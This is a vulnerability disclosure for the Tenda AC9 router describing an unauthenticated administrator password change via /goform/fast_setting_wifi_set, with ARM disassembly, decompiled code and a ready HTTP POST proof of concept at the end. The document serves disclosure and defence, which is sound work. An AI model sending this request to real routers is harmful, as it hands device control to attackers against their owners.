# Tenda AC9 /goform/fast_setting_wifi_set Unauthenticated Administrator Password Change

## 1. Vulnerability Name

**Tenda AC9 /goform/fast_setting_wifi_set Unauthenticated Administrator Password Change**

## 2. Basic Information

| Field | Content |
| --- | --- |
| **Vendor** | Tenda |
| **Product** | AC9 Dual-Band Wi-Fi Router |
| **Firmware Version** | V1.0 V15.03.05.14_multi / V15.03.05.16 |
| **Firmware File** | 49049A094561CA9365CF129DA98622171BAB8BB8EB5DA83EE8730561DA16F3F1 (SHA256) |

## 3. Vulnerability Principle & Data Flow

The endpoint `/goform/fast_setting_wifi_set` is matched by the prefix `/goform/fast_setting` in the auth-exempt whitelist of `R7WebsSecurityHandler`. When the prefix matches, the function returns `0` immediately, skipping the authentication check entirely. The handler `form_fast_setting_wifi_set` reads the user-supplied `loginPwd` parameter via `websGetVar` and writes it directly into the system configuration key `sys.userpass` via `SetValue`, then commits it to Flash with `bcm_nvram_commit`. No authentication, session verification, or current-password check is performed.

```
HTTP POST /goform/fast_setting_wifi_set  (no auth)
        │  Body: loginPwd=<MD5_HASH>
        ▼
R7WebsSecurityHandler @ 0x2f0d4
        │  strncmp(url, "/goform/fast_setting", 0x14) == 0 → return 0 (AUTH BYPASS)
        ▼
form_fast_setting_wifi_set @ 0x66f54
        │  websGetVar("loginPwd") → untrusted input
        ▼
SetValue("sys.userpass", loginPwd)   → write admin password
        ▼
CommitCfm() → bcm_nvram_commit()    → persist to Flash
        ▼
Attacker logs in with the new password → full router control
```

## 4. Key Functions

| Function | Address | Role |
| --- | --- | --- |
| `R7WebsSecurityHandler` | `0x2f0d4` | Auth-exempt whitelist; `strncmp(url, "/goform/fast_setting", 0x14)` → bypass |
| `form_fast_setting_wifi_set` | `0x66f54` | Reads `loginPwd` via `websGetVar`, writes `sys.userpass` via `SetValue` |
| `websGetVar` | `0x2b9fc` | Reads HTTP POST parameter |
| `SetValue` | `0xf5c0` | Writes value to system configuration key |
| `CommitCfm` | `0xf2e4` | Commits config |
| `bcm_nvram_commit` | `0xf3bc` | Persists configuration to Flash |

### R7WebsSecurityHandler @ 0x2f0d4 — auth-exempt bypass

```c
// phase4_decompile_output.txt line 4876 — confirmed by disassembly of httpd:
//   0x2fe88:  bl  0xf68c          ; strcmp(url, <whitelist entry>)
//   0x2fe90:  cmp r3, #0          ; match?
//   ... on match: mov r3, #0 ; str r3,[fp,#-0x18]  (set auth-passthrough flag)
if (strncmp(url, "/goform/fast_setting", 0x14) == 0) {
    return 0;  // AUTH BYPASS — return 0 before any credential check
}
```

```asm
; R7WebsSecurityHandler @ 0x2f0d4 (excerpt, ARM)
0x0002f0d4:  push     {r4, r5, r6, r7, fp, lr}
0x0002f0d8:  add      fp, sp, #0x14
0x0002f0dc:  sub      sp, sp, #0x480
...
0x0002fe7c:  ldr      r3, [pc, #0x278]      ; GOT -> "/goform/fast_setting"
0x0002fe80:  ldr      r3, [r4, r3]
0x0002fe84:  mov      r1, r3
0x0002fe88:  bl       #0xf68c               ; strcmp(url, "/goform/fast_setting")
0x0002fe8c:  mov      r3, r0
0x0002fe90:  cmp      r3, #0
0x0002fe94:  bne      #0x2feb8              ; not matched -> next entry
...
0x0002ff14:  mov      r3, #0                ; matched -> set passthrough flag = 0
0x0002ff18:  str      r3, [fp, #-0x18]      ; AUTH BYPASS
```

### form_fast_setting_wifi_set @ 0x66f54 — password write

```asm
; form_fast_setting_wifi_set @ 0x66f54 (excerpt, ARM)
0x00067074:  ldr      r0, [fp, #-0x168]     ; arg0 = request handle
0x00067078:  ldr      r3, [pc, #0x5f4]      ; GOT -> "loginPwd"
0x0006707c:  add      r3, r4, r3
0x00067080:  mov      r1, r3                ; arg1 = "loginPwd"
0x00067084:  ldr      r3, [pc, #0x5ec]      ; arg2 = default ""
0x0006708c:  mov      r2, r3
0x00067090:  bl       #0x2b9fc              ; websGetVar(req, "loginPwd", "")
0x00067094:  str      r0, [fp, #-0x18]      ; save returned value
...
0x000670e4:  sub      r3, fp, #0x78         ; local buffer = loginPwd value
0x000670e8:  ldr      r2, [pc, #0x590]      ; GOT -> "sys.userpass"
0x000670f0:  mov      r0, r2                ; arg0 = "sys.userpass"
0x000670f4:  mov      r1, r3                ; arg1 = loginPwd value (UNTRUSTED)
0x000670f8:  bl       #0xf5c0               ; SetValue("sys.userpass", loginPwd)
```

```c
// decompiled form_fast_setting_wifi_set @ 0x66f54
local_18 = websGetVar(param_1, "loginPwd", "");   // untrusted POST input
SetValue("sys.userpass", local_18);               // write admin password
CommitCfm();
bcm_nvram_commit();                               // persist to Flash
```

## 5. Test PoC

```http
POST /goform/fast_setting_wifi_set HTTP/1.1
Host: <TARGET>:8080
Content-Type: application/x-www-form-urlencoded

loginPwd=21232f297a57a5a743894a0e4a801fc3
```
